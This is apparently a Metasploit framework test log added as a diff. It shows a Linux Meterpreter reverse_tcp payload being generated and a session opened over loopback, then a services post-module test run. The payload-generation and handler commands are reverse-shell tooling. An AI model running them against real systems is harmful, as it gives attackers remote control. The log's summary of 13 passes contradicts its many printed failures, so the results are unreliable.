@@ -1,0 +1,53 @@
+use linux/x64/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> generate -o /tmp/meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220129-3635-1rfve32 -f elf MeterpreterTryToFork=false lport=6054 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> [*] Writing 250 bytes to /tmp/meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220129-3635-1rfve32...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 53
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6054 
+[*] Sending stage (3012548 bytes) to 127.0.0.1
+[*] Meterpreter session 54 opened (127.0.0.1:6054 -> 127.0.0.1:44054 ) at 2022-01-29 00:21:02 +0000
+use test/services
+[4mmsf6[0m post([1m[31mtest/services[0m) [0m> run session=54 addentropy=true verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: linux
+[!]  * unloadable Meterpreter extension: extapi
+[*] Running against session 54
+[*] Session type is meterpreter and platform is linux
+[-] FAILED: should start W32Time
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should stop W32Time
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should list services
+[-] Exception: RuntimeError : x86_64-linux-musl/extapi not found
+[-] FAILED: should start a disabled service aUSQbZ
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should return info on a given service  winmgmt
+[-] Exception: RuntimeError : x86_64-linux-musl/extapi not found
+[-] FAILED: should modify config on a given service axKHWf
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should create a service  testes
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should return info on the newly-created service testes
+[-] Exception: RuntimeError : x86_64-linux-musl/extapi not found
+[-] FAILED: should delete the new service testes
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[-] FAILED: should restart a started service W32Time
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[+] should raise a runtime exception if no access to service
+[+] should raise a runtime exception if services doesnt exist
+[-] FAILED: should return status on a given service winmgmt
+[-] Exception: RuntimeError : Library advapi32 not found. Known libraries: ["libc"]
+
+[*] Testing complete in 0.00614696
+[*] Passed: 13; Failed: 0
+[*] Post module execution completed
